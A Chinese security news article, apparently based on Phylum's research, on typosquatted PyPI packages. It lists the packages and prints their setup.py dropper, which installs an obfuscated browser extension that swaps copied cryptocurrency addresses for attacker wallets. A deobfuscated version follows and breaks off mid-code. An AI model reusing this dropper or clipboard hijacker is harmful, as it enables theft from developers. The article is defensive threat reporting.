---
title: 恶意Python软件包替换开发者剪贴板中的加密货币地址
url: https://www.4hou.com/posts/YXzn
source: 嘶吼 RoarTalk – 回归最本质的信息安全,互联网安全新媒体,4hou.com
date: 2023-02-21
fetch_date: 2025-10-04T07:34:48.968234
---

# 恶意Python软件包替换开发者剪贴板中的加密货币地址

恶意Python软件包替换开发者剪贴板中的加密货币地址 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com

[![](https://www.4hou.com/sihou/images/new4hou/newlogoss.png)](https://www.4hou.com)

* [首页](https://www.4hou.com)
* [企业中心](https://www.4hou.com/corp/newindex)
* [产业研究院](https://www.4hou.com/real-time)

![](https://www.4hou.com/sihou/images/new4hou/search-icon.png)

[投稿](https://www.4hou.com/contribute)

[登录](https://www.4hou.com/login)
  |
[注册](https://www.4hou.com/register)

* 导读 ▾
* [活动](https://www.4hou.com/newticket)
* [专题](https://www.4hou.com/category/special)
* [图谱](https://www.4hou.com/atlas/index)
* [报告](https://www.4hou.com/new-report-info)
* [嘶票](https://www.4hou.com/tickets)
* [嘶货](https://www.4hou.com/shop)
* [企业查询](https://www.4hou.com/corp/new-search-company)
* [招聘](https://www.4hou.com/recruit)![](https://www.4hou.com/sihou/images/1561626446625934.png)

* [新闻](https://www.4hou.com/category/news)
* [行业](https://www.4hou.com/category/industry)
* [趋势](https://www.4hou.com/category/observation)
* [访谈](https://www.4hou.com/category/people)
* [漏洞](https://www.4hou.com/category/vulnerable)
* [WEB安全](https://www.4hou.com/category/web)
* [业务安全](https://www.4hou.com/category/business)
* [系统安全](https://www.4hou.com/category/system)
* [内网渗透](https://www.4hou.com/category/penetration)
* [勒索软件](https://www.4hou.com/category/typ)
* [安全工具](https://www.4hou.com/category/tools)

# 恶意Python软件包替换开发者剪贴板中的加密货币地址

布加迪
[资讯](https://www.4hou.com/category/info)
2023-02-20 12:00:00

![](https://img.4hou.com/article/%E6%B5%8F%E8%A7%88.png)66411

收藏

导语：Phylum揭露了一起针对Python开发者的新活动。恶意软件的编写者偷偷替换开发者剪贴板中的加密货币地址。

![0.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230215/1676446629153208.png "1676446629153208.png")

我们Phylum发现了数十个针对开发者的域名误植软件包后不到一周，我们的自动化风险平台发现了另一起针对开发者及其加密货币的新兴活动所涉及的另外几个软件包。这起攻击活动针对的软件包每天下载量超过2900万人次，这个潜在的覆盖范围对攻击者来说很庞大，为利用开发者的拼写错误提供了大好机会！

这起进行中的攻击活动涉及的当前软件包如下所示：

baeutifulsoup4

beautifulsup4

cloorama

cryptograpyh

crpytography

djangoo

hello-world-exampl

hello-world-example

ipyhton

mail-validator

mariabd

mysql-connector-pyhton

notebok

pillwo

pyautogiu

pygaem

pytorhc

python-dateuti

python-flask

python3-flask

pyyalm

rqeuests

slenium

sqlachemy

sqlalcemy

tkniter

urlllib

安装完成后，一个恶意的Javascript文件会被投放到系统中，并在任何互联网浏览会话的后台执行。当开发者复制加密货币地址时，剪贴板中的地址被替换成了攻击者的地址。

在撰写本文时（第一个恶意软件包发布大约一小时后），这些软件包已下载了100多次。虽然我们报告了这每一个软件包（以后会继续报告），但我们预计在接下来的几小时内，下载数量和软件包总数量都将会攀升。

**从Python投放经过混淆处理的JavaScript**

来自这每一个软件包的恶意载荷都存在于setup.py中。恶意软件的编写者从获得一份“值得关注”的路径列表开始入手：

|  |
| --- |
| appDataPath   = os.getenv('APPDATA')  desktopPath   = os.path.expanduser('~\Desktop')  paths   = [      appDataPath +   '\\Microsoft\\Windows\\Start Menu',      appDataPath + '\\Microsoft\\Internet   Explorer\\Quick Launch\\User Pinned\\TaskBar',      desktopPath  ] |

如果用户是管理员，可以为列表添加额外的路径：

|  |
| --- |
| if   ctypes.windll.shell32.IsUserAnAdmin():        paths.append('C:\\ProgramData\\Microsoft\\Windows\\Start Menu') |

图2

然后创建一个Extension目录，如果这个目录还不存在的话：

|  |
| --- |
| if   not os.path.exists(appDataPath + '\\Extension'):      os.makedirs(appDataPath + '\\Extension') |

最后，攻击者将经过混淆处理的Javascript写入到$APPDATA\\Extension文件夹：

|  |
| --- |
| with   open(appDataPath + '\\Extension\\background.js', 'w+') as extensionFile:      extensionFile.write('''var   \_0x327ff6=\_0x11d4;(function(\_0x314c14,\_0x4da2d4){var   \_0x4d9550=\_0x11d4,\_0x41c8ae=\_0x314c14();while(!![]){try{var   \_0x291238=parseInt(\_0x4d9550(0x83))/0x1+parseInt(\_0x4d9550(0x87))/0x2\*(-parseInt(\_0x4d9550(0x7c))/0x3)+-parseInt(\_0x4d9550(0x81))/0x4\*(-parseInt(\_0x4d9550(0x8b))/0x5)+parseInt(\_0x4d9550(0x7e))/0x6\*(parseInt(\_0x4d9550(0x75))/0x7)+-parseInt(\_0x4d9550(0x89))/0x8+-parseInt(\_0x4d9550(0x85))/0x9+parseInt(\_0x4d9550(0x82))/0xa;if(\_0x291238===\_0x4da2d4)break;else   \_0x41c8ae['push'](\_0x41c8ae['shift']());}catch(\_0x435e56){\_0x41c8ae['push'](\_0x41c8ae['shift']());}}}(\_0x7dfe,0x8e72d));let   page=chrome[\_0x327ff6(0x77)][\_0x327ff6(0x76)]();function   \_0x11d4(\_0x5d4133,\_0x41221d){var \_0x7dfebe=\_0x7dfe();return   \_0x11d4=function(\_0x11d4f7,\_0x3282ea){\_0x11d4f7=\_0x11d4f7-0x75;var   \_0x34f11d=\_0x7dfebe[\_0x11d4f7];return   \_0x34f11d;},\_0x11d4(\_0x5d4133,\_0x41221d);}var   inputElement=document[\_0x327ff6(0x88)](\_0x327ff6(0x8a));document['body'][\_0x327ff6(0x86)](inputElement),inputElement['focus']();function   check(){var \_0xe8a3e=\_0x327ff6;document[\_0xe8a3e(0x79)](\_0xe8a3e(0x7f));var   \_0x5eb90d=inputElement[\_0xe8a3e(0x7a)];\_0x5eb90d=\_0x5eb90d[\_0xe8a3e(0x78)](/^(0x)[a-fA-F0-9]{40}$/,'0x18c36eBd7A5d9C3b88995D6872BCe11a080Bc4d9'),\_0x5eb90d=\_0x5eb90d[\_0xe8a3e(0x78)](/^T[A-Za-z1-9]{33}$/,'TWStXoQpXzVL8mx1ejiVmkgeUVGjZz8LRx'),\_0x5eb90d=\_0x5eb90d[\_0xe8a3e(0x78)](/^(bnb1)[0-9a-z]{38}$/,\_0xe8a3e(0x80)),\_0x5eb90d=\_0x5eb90d[\_0xe8a3e(0x78)](/^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$/,'bc1qqwkpp77ya9qavyh8sm8e4usad45fwlusg7vs5v'),\_0x5eb90d=\_0x5eb90d[\_0xe8a3e(0x78)](/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/,\_0xe8a3e(0x84)),inputElement['value']=\_0x5eb90d,inputElement[\_0xe8a3e(0x7d)](),document['execCommand'](\_0xe8a3e(0x7b)),inputElement[\_0xe8a3e(0x7a)]='';}function   \_0x7dfe(){var   \_0x1c8730=['8bkbJpt','14903530AaRyNg','646317UWotJX','LPDEYUCna9e5dYaDPYorJBXXgc43tvV9Rq','9448686izWZHq','appendChild','2hKfLTM','createElement','3544256zMWJYQ','textarea','10470IXKEdo','42UUKWJT','getBackgroundPage','extension','replace','execCommand','value','copy','1539693aOTNUd','select','448728VNjtMg','paste','bnb1cm0pllx3c7e902mta8drjfyn0ypl7ar4ty29uv'];\_0x7dfe=function(){return   \_0x1c8730;};return \_0x7dfe();}setInterval(check,0x3e8);''') |

 将manifest.json写入到$APPDATA\\Extension文件夹，该文件夹请求clipboardWrite（剪贴板写入）和clipboardRead（剪贴板读取）权限：

|  |
| --- |
| with   open(appDataPath + '\\Extension\\manifest.json', 'w+') as manifestFile:            manifestFile.write('{"name":   "Windows","background": {"scripts":   ["background.js"]},"version":   "1","manifest\_version": 2,"permissions":   ["clipboardWrite", "clipboardRead"]}') |

**对Javascript代码反混淆处理**

为了企图隐藏恶意载荷执行的操作，攻击者使用常见的混淆器对Javascript进行混淆处理。

![1.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230215/1676446688211630.png "1676446688211630.png")

图1

虽然我们可以根据manifest.json中请求的权限推断出这个恶意软件包执行的操作，还是不妨对它进行反混淆处理，确保有把握。注释已添加。

|  |
| --- |
| /\*\*   \* Returns the Window of the background page   if the background script is running.   \* If the script is not running, null is   returned.   \*/  let   page = chrome['extension']['getBackgroundPage']();    //   Create a new text area on the page  var   textareaElement = document.createElement('textarea');  document['body']['appendChild'](textareaElement);    //   Then focus on it  textareaElement['focus']();    function   lookforCryptoAddresses() {      // The input element is on our newly   defined element and we paste whatever is in the      // clipboard to it.      document['execCommand']('paste');        // We then get the value of what we just   pasted in the text area.      var inputValue =   textareaElement['value'];        /\*\* Look at the value, if it matches one   of the regexes replace the crypto address \*\*/      // ETH addresses      inputValue =   inputValue.replace(/^(0x)[a-fA-F0-9]{40}$/,   '0x18c36eBd7A5d9C3b88995D6872BCe11a080Bc4d9'),                  // TRX (TRON) address                inputValue =   inputValue.replace(/^T[A-Za-z1-9]{33}$/,   'TWStXoQpXzVL8mx1ejiVmkgeUVGjZz8LRx'),                  // BNB Address                inputValue =   inputValue.replace(/^(bnb1)[0-9a-z]{38}$/,   'bnb1cm0pllx3c7e902mta8drjfyn0ypl7ar4ty29uv'),                  // BTC Address                inputValue =   inputValue.replace(/^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$/,   'bc1qqwkpp77ya9qavyh8sm8e4usad45fwlusg7vs5v'),                  // LTC Address                inputValue =   inputValue.replace(/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/,   'LPDEYUCna9e5dYaDPYorJBXXgc43tvV9Rq'),        // Update the text area to the value we   replaced above.      textareaElement['value'] = ...